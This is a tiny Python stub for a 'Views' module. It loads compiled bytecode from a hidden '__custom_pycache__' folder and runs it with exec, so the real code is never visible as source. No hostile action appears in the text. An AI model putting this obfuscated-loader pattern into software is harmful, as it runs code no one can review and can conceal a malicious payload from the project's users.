
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Views_1c6bb8448ae644dbb30aaeae5e23ba6d.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
